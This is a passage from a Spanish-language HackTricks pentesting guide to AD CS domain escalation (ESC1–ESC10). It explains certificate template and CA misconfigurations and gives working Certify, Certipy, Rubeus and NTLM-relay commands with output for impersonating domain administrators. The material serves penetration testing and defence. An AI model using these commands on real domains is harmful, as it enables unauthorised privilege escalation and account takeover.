# Escalación de dominio AD CS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Plantillas de certificados mal configuradas - ESC1

### Explicación

* El **CA empresarial** otorga **derechos de inscripción a usuarios con privilegios bajos**
* **La aprobación del administrador está desactivada**
* **No se requieren firmas autorizadas**
* Un descriptor de seguridad de **plantilla de certificado demasiado permisivo otorga derechos de inscripción de certificados a usuarios con privilegios bajos**
* La **plantilla de certificado define EKUs que permiten la autenticación**:
  * _Autenticación de cliente (OID 1.3.6.1.5.5.7.3.2), Autenticación de cliente PKINIT (1.3.6.1.5.2.3.4), Inicio de sesión con tarjeta inteligente (OID 1.3.6.1.4.1.311.20.2.2), Cualquier propósito (OID 2.5.29.37.0) o sin EKU (SubCA)._
* La **plantilla de certificado permite a los solicitantes especificar un subjectAltName en el CSR**:
  * **AD** utilizará la identidad especificada por el campo **subjectAltName** (SAN) de un certificado **si está presente**. Por lo tanto, si un solicitante puede especificar el SAN en un CSR, el solicitante puede **solicitar un certificado como cualquier persona** (por ejemplo, un usuario de administrador de dominio). El objeto AD de la plantilla de certificado **especifica** si el solicitante **puede especificar el SAN** en su propiedad **`mspki-certificate-name-`**`flag`. La propiedad `mspki-certificate-name-flag` es una **máscara de bits** y si la bandera **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** está **presente**, un **solicitante puede especificar el SAN.**

{% hint style="danger" %}
Estas configuraciones permiten que un **usuario con privilegios bajos solicite un certificado con un SAN arbitrario**, lo que permite al usuario con privilegios bajos autenticarse como cualquier principal en el dominio a través de Kerberos o SChannel.
{% endhint %}

Esto a menudo se habilita, por ejemplo, para permitir que los productos o servicios de implementación generen certificados HTTPS o certificados de host sobre la marcha. O debido a la falta de conocimiento.

Tenga en cuenta que cuando se crea un certificado con esta última opción, aparece una **advertencia**, pero no aparece si se **duplica una plantilla de certificado** con esta configuración (como la plantilla `WebServer` que tiene `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` habilitado y luego el administrador puede agregar un OID de autenticación).

### Abuso

Para **encontrar plantillas de certificados vulnerables**, puede ejecutar:
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
Para **abusar de esta vulnerabilidad para hacerse pasar por un administrador**, se podría ejecutar:
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
```
Entonces puedes transformar el **certificado generado a formato `.pfx`** y usarlo para **autenticarte usando Rubeus o certipy** de nuevo:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Los binarios de Windows "Certreq.exe" y "Certutil.exe" pueden ser utilizados para generar el PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Además, la siguiente consulta LDAP, cuando se ejecuta en el esquema de configuración del bosque AD, se puede utilizar para **enumerar** las **plantillas de certificados** que no requieren aprobación/firmas, que tienen un EKU de **Autenticación de cliente o Inicio de sesión de tarjeta inteligente**, y tienen la bandera **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** habilitada:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Plantillas de Certificado Mal Configuradas - ESC2

### Explicación

El segundo escenario de abuso es una variación del primero:

1. El CA empresarial otorga derechos de inscripción a usuarios de bajo privilegio.
2. La aprobación del gerente está deshabilitada.
3. No se requieren firmas autorizadas.
4. Un descriptor de seguridad de plantilla de certificado excesivamente permisivo otorga derechos de inscripción de certificado a usuarios de bajo privilegio.
5. **La plantilla de certificado define el EKU de cualquier propósito o no tiene EKU.**

El **EKU de cualquier propósito** permite a un atacante obtener un **certificado** para **cualquier propósito** como autenticación de cliente, autenticación de servidor, firma de código, etc. La misma **técnica que para ESC3** se puede utilizar para abusar de esto.

Un **certificado sin EKUs** - un certificado de CA subordinado - también se puede abusar para **cualquier propósito**, pero también podría **usarse para firmar nuevos certificados**. Como tal, utilizando un certificado de CA subordinado, un atacante podría **especificar EKUs o campos arbitrarios en los nuevos certificados.**

Sin embargo, si el **CA subordinado no es de confianza** por el objeto **`NTAuthCertificates`** (lo cual no será por defecto), el atacante **no puede crear nuevos certificados** que funcionen para **la autenticación de dominio**. Aún así, el atacante puede crear **nuevos certificados con cualquier EKU** y valores de certificado arbitrarios, de los cuales hay **muchos** que el atacante podría potencialmente **abusar** (por ejemplo, firma de código, autenticación de servidor, etc.) y podría tener grandes implicaciones para otras aplicaciones en la red como SAML, AD FS o IPSec.

La siguiente consulta LDAP, cuando se ejecuta contra el esquema de configuración del bosque AD, se puede utilizar para enumerar plantillas que coincidan con este escenario:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Plantillas de Agente de Inscripción Mal Configuradas - ESC3

### Explicación

Este escenario es similar al primero y al segundo, pero **abusando** de un **EKU diferente** (Agente de Solicitud de Certificado) y **2 plantillas diferentes** (por lo tanto, tiene 2 conjuntos de requisitos).

El **EKU de Agente de Solicitud de Certificado** (OID 1.3.6.1.4.1.311.20.2.1), conocido como **Agente de Inscripción** en la documentación de Microsoft, permite a un principal **inscribirse** para un **certificado** en **nombre de otro usuario**.

El **"agente de inscripción"** se inscribe en tal **plantilla** y utiliza el **certificado resultante para co-firmar una CSR en nombre del otro usuario**. Luego **envía** la **CSR co-firmada** al CA, inscribiéndose en una **plantilla** que **permite "inscribir en nombre de"**, y el CA responde con un **certificado perteneciente al "otro" usuario**.

**Requisitos 1:**

1. El CA empresarial permite a los usuarios de baja privilegiados derechos de inscripción.
2. La aprobación del administrador está deshabilitada.
3. No se requieren firmas autorizadas.
4. Un descriptor de seguridad de plantilla de certificado demasiado permisivo permite derechos de inscripción de certificado a usuarios de baja privilegiados.
5. La **plantilla de certificado define el EKU de Agente de Solicitud de Certificado**. El OID de Agente de Solicitud de Certificado (1.3.6.1.4.1.311.20.2.1) permite solicitar otras plantillas de certificado en nombre de otros principales.

**Requisitos 2:**

1. El CA empresarial permite a los usuarios de baja privilegiados derechos de inscripción.
2. La aprobación del administrador está deshabilitada.
3. **La versión del esquema de la plantilla es 1 o es mayor que 2 y especifica un Requisito de Emisión de Política de Aplicación que requiere el EKU de Agente de Solicitud de Certificado.**
4. La plantilla de certificado define un EKU que permite la autenticación de dominio.
5. Las restricciones del agente de inscripción no se implementan en el CA.

### Abuso

Puede utilizar [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) para abusar de este escenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Los CAs empresariales pueden **restringir** a los **usuarios** que pueden **obtener** un **certificado de agente de inscripción**, las plantillas de inscripción de **agentes en las que pueden inscribirse**, y en qué **cuentas** el agente de inscripción puede **actuar en nombre de** abriendo `certsrc.msc` `snap-in -> haciendo clic derecho en el CA -> haciendo clic en Propiedades -> navegando` hasta la pestaña "Agentes de inscripción".

Sin embargo, la configuración predeterminada del CA es "**No restringir a los agentes de inscripción**". Incluso cuando los administradores habilitan "Restringir a los agentes de inscripción", la configuración predeterminada es extremadamente permisiva, permitiendo que Todos tengan acceso a inscribirse en todas las plantillas como cualquier persona.

## Control de acceso vulnerable a plantillas de certificados - ESC4

### **Explicación**

Las **plantillas de certificados** tienen un **descriptor de seguridad** que especifica qué **principales de AD** tienen **permisos específicos sobre la plantilla**.

Si un **atacante** tiene suficientes **permisos** para **modificar** una **plantilla** y **crear** cualquiera de las **configuraciones incorrectas** explotables de las **secciones anteriores**, podrá explotarla y **escalar privilegios**.

Derechos interesantes sobre plantillas de certificados:

* **Propietario:** Control total implícito del objeto, puede editar cualquier propiedad.
* **Control total:** Control total del objeto, puede editar cualquier propiedad.
* **Escribir propietario:** Puede modificar el propietario a un principal controlado por el atacante.
* **Escribir DACL**: Puede modificar el control de acceso para otorgar Control total a un atacante.
* **Escribir propiedad:** Puede editar cualquier propiedad.

### Abuso

Un ejemplo de privesc como el anterior:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 es cuando un usuario tiene privilegios de escritura sobre una plantilla de certificado. Esto puede ser abusado, por ejemplo, para sobrescribir la configuración de la plantilla de certificado para hacer que la plantilla sea vulnerable a ESC1.

Como podemos ver en la ruta anterior, solo `JOHNPC` tiene estos privilegios, pero nuestro usuario `JOHN` tiene el nuevo borde `AddKeyCredentialLink` a `JOHNPC`. Dado que esta técnica está relacionada con los certificados, también he implementado este ataque, que se conoce como [Credenciales de sombra](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Aquí hay un pequeño adelanto del comando `shadow auto` de Certipy para recuperar el hash NT de la víctima.

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**Certipy** puede sobrescribir la configuración de una plantilla de certificado con un solo comando. Por **defecto**, Certipy **sobrescribirá** la configuración para hacerla **vulnerable a ESC1**. También podemos especificar el parámetro **`-save-old` para guardar la configuración antigua**, lo que será útil para **restaurar** la configuración después de nuestro ataque.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Control de acceso vulnerable a objetos PKI - ESC5

### Explicación

La red de relaciones basadas en ACL interconectadas que pueden afectar la seguridad de AD CS es extensa. Varios **objetos fuera de las plantillas de certificados** y la propia autoridad de certificación pueden tener un **impacto en la seguridad de todo el sistema AD CS**. Estas posibilidades incluyen (pero no se limitan a):

* El **objeto de equipo AD del servidor CA** (es decir, compromiso a través de S4U2Self o S4U2Proxy)
* El **servidor RPC/DCOM del servidor CA**
* Cualquier **objeto o contenedor descendiente de AD en el contenedor** `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMINIO>,DC=<COM>` (por ejemplo, el contenedor de plantillas de certificados, el contenedor de autoridades de certificación, el objeto NTAuthCertificates, el contenedor de servicios de inscripción, etc.)

Si un atacante con pocos privilegios puede obtener **control sobre cualquiera de estos**, el ataque probablemente pueda **comprometer el sistema PKI**.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Explicación

Existe otro problema similar, descrito en el [**post de CQure Academy**](https://cqureacademy.com/blog/enhanced-key-usage), que involucra la bandera **`EDITF_ATTRIBUTESUBJECTALTNAME2`**. Como describe Microsoft, "**Si** esta bandera está **activada** en el CA, **cualquier solicitud** (incluyendo cuando el sujeto se construye a partir de Active Directory®) puede tener **valores definidos por el usuario** en el **nombre alternativo del sujeto**".\
Esto significa que un **atacante** puede inscribirse en **CUALQUIER plantilla** configurada para la **autenticación de dominio** que también **permite a los usuarios sin privilegios** inscribirse (por ejemplo, la plantilla de usuario predeterminada) y **obtener un certificado** que nos permita **autenticarnos** como un administrador de dominio (o **cualquier otro usuario/máquina activo**).

**Nota**: los **nombres alternativos** aquí se **incluyen** en una CSR a través del argumento `-attrib "SAN:"` a `certreq.exe` (es decir, "Pares de nombre y valor"). Esto es **diferente** al método para **abusar de los SAN** en ESC1 ya que **almacena información de cuenta en un atributo de certificado en lugar de una extensión de certificado**.

### Abuso

Las organizaciones pueden **verificar si la configuración está habilitada** utilizando el siguiente comando `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Debajo de todo esto, simplemente se utiliza el **registro remoto**, por lo que el siguiente comando también puede funcionar:
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags 
```
[**Certify**](https://github.com/GhostPack/Certify) y [**Certipy**](https://github.com/ly4k/Certipy) también verifican esto y pueden ser utilizados para abusar de esta mala configuración:
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Estas configuraciones pueden ser **establecidas**, asumiendo derechos de **administrador de dominio** (o equivalentes), desde cualquier sistema:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Si encuentra esta configuración en su entorno, puede **eliminar esta bandera** con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Después de las actualizaciones de seguridad de mayo de 2022, los nuevos **certificados** tendrán una **extensión de seguridad** que **incrusta** la propiedad `objectSid` del solicitante. Para ESC1, esta propiedad se reflejará desde el SAN especificado, pero con **ESC6**, esta propiedad refleja el `objectSid` del solicitante, y no del SAN.\
Por lo tanto, **para abusar de ESC6**, el entorno debe ser **vulnerable a ESC10** (Mapeos de Certificados Débiles), donde se prefiere el SAN sobre la nueva extensión de seguridad.
{% endhint %}

## Control de acceso vulnerable de la Autoridad de Certificación - ESC7

### Ataque 1

#### Explicación

Una autoridad de certificación en sí misma tiene un **conjunto de permisos** que aseguran varias **acciones de la CA**. Estos permisos se pueden acceder desde `certsrv.msc`, haciendo clic derecho en una CA, seleccionando propiedades y cambiando a la pestaña Seguridad:

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

Esto también se puede enumerar a través del [**módulo PSPKI**](https://www.pkisolutions.com/tools/pspki/) con `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
Los dos derechos principales aquí son el derecho **`ManageCA`** y el derecho **`ManageCertificates`**, que se traducen como "administrador de CA" y "administrador de certificados".

#### Abuso

Si tiene un principal con derechos **`ManageCA`** en una **autoridad de certificación**, podemos usar **PSPKI** para cambiar remotamente el bit **`EDITF_ATTRIBUTESUBJECTALTNAME2`** para permitir la especificación de SAN en cualquier plantilla ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

Esto también es posible de una forma más simple con el cmdlet [**Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) de **PSPKI**.

El derecho **`ManageCertificates`** permite **aprobar una solicitud pendiente**, lo que permite evitar la protección de "aprobación del administrador de certificados de CA".

Puede usar una **combinación** de los módulos **Certify** y **PSPKI** para solicitar un certificado, aprobarlo y descargarlo:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### Ataque 2

#### Explicación

{% hint style="warning" %}
En el **ataque anterior** **`Manage CA`** se utilizó para **habilitar** la bandera **EDITF\_ATTRIBUTESUBJECTALTNAME2** para realizar el **ataque ESC6**, pero esto no tendrá ningún efecto hasta que se reinicie el servicio de CA (`CertSvc`). Cuando un usuario tiene el derecho de acceso `Manage CA`, también se le permite **reiniciar el servicio**. Sin embargo, **no significa que el usuario pueda reiniciar el servicio de forma remota**. Además, **ESC6 podría no funcionar de forma predeterminada** en la mayoría de los entornos parcheados debido a las actualizaciones de seguridad de mayo de 2022.
{% endhint %}

Por lo tanto, aquí se presenta otro ataque.

Requisitos previos:

* Solo **permiso `ManageCA`**
* Permiso **`Manage Certificates`** (puede ser otorgado desde **`ManageCA`**)
* La plantilla de certificado **`SubCA`** debe estar **habilitada** (puede ser habilitada desde **`ManageCA`**)

La técnica se basa en el hecho de que los usuarios con el derecho de acceso `Manage CA` _y_ `Manage Certificates` pueden **emitir solicitudes de certificado fallidas**. La plantilla de certificado **`SubCA`** es **vulnerable a ESC1**, pero **solo los administradores** pueden inscribirse en la plantilla. Por lo tanto, un **usuario** puede **solicitar** inscribirse en la **`SubCA`** - lo que será **denegado** - pero **luego emitido por el administrador**.

#### Abuso

Puede **otorgarse a sí mismo el derecho de acceso `Manage Certificates`** agregando su usuario como nuevo oficial.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
La plantilla **`SubCA`** se puede **habilitar en el CA** con el parámetro `-enable-template`. Por defecto, la plantilla `SubCA` está habilitada.
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Si hemos cumplido con los requisitos previos para este ataque, podemos comenzar solicitando un certificado basado en la plantilla `SubCA`. 

Esta solicitud será denegada, pero guardaremos la clave privada y anotaremos el ID de la solicitud.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con nuestras opciones **`Manage CA` y `Manage Certificates`**, podemos entonces **emitir la solicitud de certificado fallida** con el comando `ca` y el parámetro `-issue-request <ID de solicitud>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Y finalmente, podemos **recuperar el certificado emitido** con el comando `req` y el parámetro `-retrieve <ID de solicitud>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay a los puntos finales HTTP de AD CS - ESC8

### Explicación

{% hint style="info" %}
En resumen, si un entorno tiene **AD CS instalado**, junto con un **punto final de inscripción web vulnerable** y al menos una **plantilla de certificado publicada** que permita la **inscripción de equipos de dominio y la autenticación de clientes** (como la plantilla **`Machine`** predeterminada), entonces ¡un **atacante puede comprometer CUALQUIER computadora con el servicio spooler en ejecución**!
{% endhint %}

AD CS admite varios **métodos de inscripción de certificados basados en HTTP** a través de roles adicionales del servidor AD CS que los administradores pueden instalar. Estas interfaces de inscripción de certificados basadas en HTTP son todos **ataques de retransmisión NTLM vulnerables**. Usando la retransmisión NTLM, un atacante en una **máquina comprometida puede suplantar cualquier cuenta de AD que autentique con NTLM**. Mientras se suplanta la cuenta de la víctima, un atacante podría acceder a estas interfaces web y **solicitar un certificado de autenticación de cliente basado en las plantillas de certificado `User` o `Machine`**.

* La **interfaz de inscripción web** (una aplicación ASP de aspecto antiguo accesible en `http://<caserver>/certsrv/`), por defecto solo admite HTTP, que no puede proteger contra ataques de retransmisión NTLM. Además, explícitamente solo permite la autenticación NTLM a través de su encabezado HTTP de autorización, por lo que los protocolos más seguros como Kerberos no se pueden usar.
* El **Servicio de Inscripción de Certificados** (CES), el **Servicio Web de Política de Inscripción de Certificados** (CEP) y el **Servicio de Inscripción de Dispositivos de Red** (NDES) admiten la autenticación de negociación por defecto a través de su encabezado HTTP de autorización. La autenticación de negociación **admite** Kerberos y **NTLM**; por lo tanto, un atacante puede **negociar hacia abajo la autenticación NTLM** durante los ataques de retransmisión. Estos servicios web al menos habilitan HTTPS por defecto, pero desafortunadamente HTTPS por sí solo no protege contra ataques de retransmisión NTLM. Solo cuando HTTPS se combina con el enlace de canal, los servicios HTTPS pueden protegerse de los ataques de retransmisión NTLM. Desafortunadamente, AD CS no habilita la Protección Extendida para la Autenticación en IIS, que es necesaria para habilitar el enlace de canal.

Los **problemas** comunes con los ataques de retransmisión NTLM son que las **sesiones NTLM suelen ser cortas** y que el atacante **no puede** interactuar con servicios que **imponen la firma NTLM**.

Sin embargo, el abuso de un ataque de retransmisión NTLM para obtener un certificado del usuario resuelve estas limitaciones, ya que la sesión vivirá mientras el certificado sea válido y el certificado se puede usar para usar servicios que **imponen la firma NTLM**. Para saber cómo usar un certificado robado, consulte:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

Otra limitación de los ataques de retransmisión NTLM es que **requieren que una cuenta víctima se autentique en una máquina controlada por el atacante**. Un atacante podría esperar o podría intentar **forzarlo**:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Abuso**

El comando `cas` de **Certify**](https://github.com/GhostPack/Certify) puede enumerar los **puntos finales HTTP de AD CS habilitados**:
```
Certify.exe cas
```
Las Autoridades de Certificación Empresariales también almacenan los puntos finales de SCE en su objeto AD en la propiedad `msPKI-Enrollment-Servers`. **Certutil.exe** y **PSPKI** pueden analizar y listar estos puntos finales:
```
certutil.exe -enrollmentServerURL -config CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA
```
<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption>Figura: Ejemplo de una solicitud de certificado de dominio</figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

Por defecto, Certipy solicitará un certificado basado en la plantilla `Machine` o `User` dependiendo de si el nombre de la cuenta transmitida termina con `$`. Es posible especificar otra plantilla con el parámetro `-template`.

Luego podemos usar una técnica como [PetitPotam](https://github.com/ly4k/PetitPotam) para forzar la autenticación. Para los controladores de dominio, debemos especificar `-template DomainController`.
```
$ certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#5485" id="5485"></a>

### Explicación

ESC9 se refiere al nuevo valor **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) de la plantilla de certificado **`msPKI-Enrollment-Flag`**. Si se establece esta bandera en una plantilla de certificado, la nueva extensión de seguridad **`szOID_NTDS_CA_SECURITY_EXT`** **no** se incrustará. ESC9 solo es útil cuando `StrongCertificateBindingEnforcement` se establece en `1` (predeterminado), ya que una configuración de asignación de certificado más débil para Kerberos o Schannel se puede abusar como ESC10, sin ESC9, ya que los requisitos serán los mismos.

* `StrongCertificateBindingEnforcement` no establecido en `2` (predeterminado: `1`) o `CertificateMappingMethods` contiene la bandera `UPN`
* El certificado contiene la bandera `CT_FLAG_NO_SECURITY_EXTENSION` en el valor `msPKI-Enrollment-Flag`
* El certificado especifica cualquier EKU de autenticación de cliente
* `GenericWrite` sobre cualquier cuenta A para comprometer cualquier cuenta B

### Abuso

En este caso, `John@corp.local` tiene `GenericWrite` sobre `Jane@corp.local`, y deseamos comprometer `Administrator@corp.local`. Se permite que `Jane@corp.local` se inscriba en la plantilla de certificado `ESC9` que especifica la bandera `CT_FLAG_NO_SECURITY_EXTENSION` en el valor `msPKI-Enrollment-Flag`.

Primero, obtenemos el hash de `Jane` con, por ejemplo, Shadow Credentials (usando nuestro `GenericWrite`).

<figure><img src="../../../.gitbook/assets/image (13) (1) (1) (1) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (22).png" alt=""><figcaption></figcaption></figure>

A continuación, cambiamos el `userPrincipalName` de `Jane` para que sea `Administrator`. Observe que estamos dejando fuera la parte `@corp.local`.

<figure><img src="../../../.gitbook/assets/image (2) (2) (3).png" alt=""><figcaption></figcaption></figure>

Esto no es una violación de restricción, ya que el `userPrincipalName` del usuario `Administrator` es `Administrator@corp.local` y no `Administrator`.

Ahora, solicitamos la plantilla de certificado vulnerable `ESC9`. Debemos solicitar el certificado como `Jane`.

<figure><img src="../../../.gitbook/assets/image (16) (2).png" alt=""><figcaption></figcaption></figure>

Observe que el `userPrincipalName` en el certificado es `Administrator` y que el certificado emitido no contiene un "SID de objeto".

Luego, volvemos a cambiar el `userPrincipalName` de `Jane` para que sea algo más, como su `userPrincipalName` original `Jane@corp.local`.

<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>

Ahora, si intentamos autenticarnos con el certificado, recibiremos el hash NT del usuario `Administrator@corp.local`. Deberá agregar `-domain <domain>` a su línea de comando ya que no se especifica ningún dominio en el certificado.

<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>

## Mapeos de certificados débiles - ESC10

### Explicación

ESC10 se refiere a dos valores de clave de registro en el controlador de dominio.

`HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` `CertificateMappingMethods`. Valor predeterminado `0x18` (`0x8 | 0x10`), anteriormente `0x1F`.

